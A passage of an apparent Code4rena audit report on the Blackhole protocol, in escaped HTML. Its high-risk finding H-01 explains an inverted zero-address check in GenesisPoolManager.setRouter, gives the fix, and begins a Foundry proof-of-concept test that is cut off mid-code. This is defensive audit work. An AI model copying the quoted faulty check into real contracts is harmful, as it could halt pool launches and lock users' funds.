href=\"https://code4rena.com\"\u003ethe C4 website\u003c/a\u003e, specifically our section on \u003ca href=\"https://docs.code4rena.com/awarding/judging-criteria/severity-categorization\"\u003eSeverity Categorization\u003c/a\u003e.\u003c/p\u003e\n\u003ch1 id=\"high-risk-findings-2\" style=\"position:relative;\"\u003e\u003ca href=\"#high-risk-findings-2\" aria-label=\"high risk findings 2 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eHigh Risk Findings (2)\u003c/h1\u003e\n\u003ch2 id=\"h-01-router-address-validation-logic-error-prevents-valid-router-assignment\" style=\"position:relative;\"\u003e\u003ca href=\"#h-01-router-address-validation-logic-error-prevents-valid-router-assignment\" aria-label=\"h 01 router address validation logic error prevents valid router assignment permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-86\"\u003e[H-01] Router address validation logic error prevents valid router assignment\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-245\"\u003efrancoHacker\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-243\"\u003eAvantGard\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-397\"\u003edreamcoder\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-46\"\u003eEgbe\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-319\"\u003eFavourOkerri\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-489\"\u003eharsh123\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-244\"\u003eholtzzx\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-479\"\u003eIzuMan\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-506\"\u003eNexusAudits\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-293\"\u003erayss\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-529\"\u003eSparrow\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/GenesisPoolManager.sol#L314\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/GenesisPoolManager.sol#L314\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description\" aria-label=\"finding description permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003esetRouter(address _router)\u003c/code\u003e function within the \u003ccode\u003eGenesisPoolManager\u003c/code\u003e contract is intended to allow the contract owner (\u003ccode\u003eowner\u003c/code\u003e) to modify the address of the \u003ccode\u003erouter\u003c/code\u003e contract. This router is crucial for interacting with the decentralized exchange (DEX) when adding liquidity during the launch of a \u003ccode\u003eGenesisPool\u003c/code\u003e. However, the function contains a logical flaw in its \u003ccode\u003erequire\u003c/code\u003e statement:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"0\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_router\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_router\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;ZA\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// \u0026lt;\u0026lt;\u0026lt; LOGICAL ERROR HERE\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_router\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe line \u003ccode\u003erequire(_router == address(0), \"ZA\");\u003c/code\u003e currently mandates that the \u003ccode\u003e_router\u003c/code\u003e address provided as an argument \u003cem\u003emust be\u003c/em\u003e the zero address (\u003ccode\u003eaddress(0)\u003c/code\u003e). If any other address (i.e., a valid, non-zero router address) is supplied, the condition \u003ccode\u003e_router == address(0)\u003c/code\u003e will evaluate to false, and the transaction will revert with the error message “ZA” (presumably “Zero Address”).\u003c/p\u003e\n\u003cp\u003eThis means the \u003ccode\u003esetRouter\u003c/code\u003e function’s behavior is inverted from what its name and intended purpose imply:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCurrent Behavior:\u003c/strong\u003e It only allows the \u003ccode\u003eowner\u003c/code\u003e to set the \u003ccode\u003erouter\u003c/code\u003e state variable to \u003ccode\u003eaddress(0)\u003c/code\u003e. It does not permit updating it to a new, functional router address.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eExpected Behavior (based on name and usage):\u003c/strong\u003e It should allow the \u003ccode\u003eowner\u003c/code\u003e to set the \u003ccode\u003erouter\u003c/code\u003e state variable to a new, valid, non-zero router address, likely with a check ensuring \u003ccode\u003e_router\u003c/code\u003e is not \u003ccode\u003eaddress(0)\u003c/code\u003e (i.e., \u003ccode\u003erequire(_router != address(0), \"ZA\");\u003c/code\u003e).\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"root-cause\" style=\"position:relative;\"\u003e\u003ca href=\"#root-cause\" aria-label=\"root cause permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRoot Cause\u003c/h3\u003e\n\u003cp\u003eThe root cause of the issue is an incorrect condition in the \u003ccode\u003erequire\u003c/code\u003e statement. The developer likely intended either to ensure a non-null router address was not being set (if such a check was desired for some specific reason, though unlikely for a setter) or, probably, to ensure a non-null address \u003cem\u003ewas\u003c/em\u003e being set. Instead, the implemented condition only permits setting a null address.\u003c/p\u003e\n\u003ch3 id=\"impact\" style=\"position:relative;\"\u003e\u003ca href=\"#impact\" aria-label=\"impact permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eThe impact of this logical error is significant and can lead to several adverse consequences:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eInability to update the router to a functional address:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eIf the \u003ccode\u003erouter\u003c/code\u003e address is initially set during the \u003ccode\u003eGenesisPoolManager\u003c/code\u003e contract’s initialization (via the \u003ccode\u003einitialize\u003c/code\u003e function) and subsequently needs to be changed (e.g., due to a DEX router upgrade, an error in the initial configuration, or the deployment of a new router version), the current \u003ccode\u003esetRouter\u003c/code\u003e function will prevent this update to a functional address. The \u003ccode\u003eowner\u003c/code\u003e would only be able to “clear” the router address by setting it to \u003ccode\u003eaddress(0)\u003c/code\u003e.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003ePotential blocking of new pool launches (\u003ccode\u003e_launchPool\u003c/code\u003e):\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eThe internal \u003ccode\u003e_launchPool\u003c/code\u003e function in \u003ccode\u003eGenesisPoolManager\u003c/code\u003e is responsible for finalizing a \u003ccode\u003eGenesisPool\u003c/code\u003e’s process and adding liquidity. This function calls \u003ccode\u003eIGenesisPool(_genesisPool).launch(router, MATURITY_TIME)\u003c/code\u003e, passing the \u003ccode\u003erouter\u003c/code\u003e address stored in \u003ccode\u003eGenesisPoolManager\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eIf the \u003ccode\u003erouter\u003c/code\u003e address in \u003ccode\u003eGenesisPoolManager\u003c/code\u003e is \u003ccode\u003eaddress(0)\u003c/code\u003e (either because it was mistakenly set that way initially or because the \u003ccode\u003eowner\u003c/code\u003e used \u003ccode\u003esetRouter\u003c/code\u003e to “clear” it), the call to \u003ccode\u003eIGenesisPool.launch\u003c/code\u003e will attempt to interact with an \u003ccode\u003eIRouter(address(0))\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eFunction calls to \u003ccode\u003eaddress(0)\u003c/code\u003e typically fail or behave unpredictably (depending on low-level Solidity/EVM implementation details, but practically, they will fail when trying to execute non-existent code or decode empty return data). This will cause the \u003ccode\u003eGenesisPool\u003c/code\u003e’s \u003ccode\u003elaunch\u003c/code\u003e function to fail, and consequently, the \u003ccode\u003eGenesisPoolManager\u003c/code\u003e’s \u003ccode\u003e_launchPool\u003c/code\u003e function will also fail.\u003c/li\u003e\n\u003cli\u003eAs a result, no new \u003ccode\u003eGenesisPool\u003c/code\u003e reaching the launch stage can be successfully launched if the router address is \u003ccode\u003eaddress(0)\u003c/code\u003e. Funds intended for liquidity (both \u003ccode\u003enativeToken\u003c/code\u003e and \u003ccode\u003efundingToken\u003c/code\u003e) could become locked in the \u003ccode\u003eGenesisPool\u003c/code\u003e contract indefinitely, or until an alternative solution is implemented (if possible via governance or contract upgradeability).\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eDependency on correct initial configuration:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eThe system becomes overly reliant on the \u003ccode\u003erouter\u003c/code\u003e address being perfectly configured during the \u003ccode\u003einitialize\u003c/code\u003e call. If there’s a typo or an incorrect address is provided, there is no way to correct it via \u003ccode\u003esetRouter\u003c/code\u003e unless the contract is upgradeable and the \u003ccode\u003esetRouter\u003c/code\u003e logic itself is updated.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eMisleading functionality:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eThe function name \u003ccode\u003esetRouter\u003c/code\u003e is misleading, as it doesn’t “set” a functional router but rather only “clears” it (sets it to \u003ccode\u003eaddress(0)\u003c/code\u003e). This can lead to administrative errors and confusion.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"severity\" style=\"position:relative;\"\u003e\u003ca href=\"#severity\" aria-label=\"severity permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eSeverity\u003c/h3\u003e\n\u003cp\u003eHigh. Although the function is only accessible by the \u003ccode\u003eowner\u003c/code\u003e, its malfunction directly impacts a core functionality of the system (pool launching and liquidity provision). If the router needs to be changed or is misconfigured, this vulnerability can halt a critical part of the protocol.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps\" aria-label=\"recommended mitigation steps permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eThe condition in the \u003ccode\u003esetRouter\u003c/code\u003e function must be corrected to allow setting a non-null router address. The more common and expected logic would be:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"1\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_router\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_router\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;ZA\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// CORRECTION: Ensure the new router is not the zero address.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_router\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis correction would enable the \u003ccode\u003eowner\u003c/code\u003e to update the \u003ccode\u003erouter\u003c/code\u003e address to a new, valid address, ensuring the operational continuity and flexibility of the \u003ccode\u003eGenesisPoolManager\u003c/code\u003e.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept\" aria-label=\"proof of concept permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eDeploy a mock \u003ccode\u003eGenesisPoolManager\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eDeploy mock contracts for \u003ccode\u003eIRouter\u003c/code\u003e (just to have distinct addresses).\u003c/li\u003e\n\u003cli\u003eShow that the \u003ccode\u003eowner\u003c/code\u003e \u003cem\u003ecannot\u003c/em\u003e set a new, non-zero router address.\u003c/li\u003e\n\u003cli\u003eShow that the \u003ccode\u003eowner\u003c/code\u003e \u003cem\u003ecan\u003c/em\u003e set the router address to \u003ccode\u003eaddress(0)\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eIllustrate (conceptually, as a full launch is complex) how a zero router address would break the \u003ccode\u003e_launchPool\u003c/code\u003e (or rather, the \u003ccode\u003elaunch\u003c/code\u003e function it calls).\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdetails\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"2\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// SPDX-License-Identifier: UNLICENSED\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003epragma\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esolidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0.8\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e13\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;forge-std/Test.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;forge-std/console.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// Minimal IRouter interface needed for the PoC\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003einterface\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eIRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esomeRouterFunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epure\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// Minimal IGenesisPool interface needed for the PoC\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003einterface\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eIGenesisPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003elaunch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ematurityTime\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan 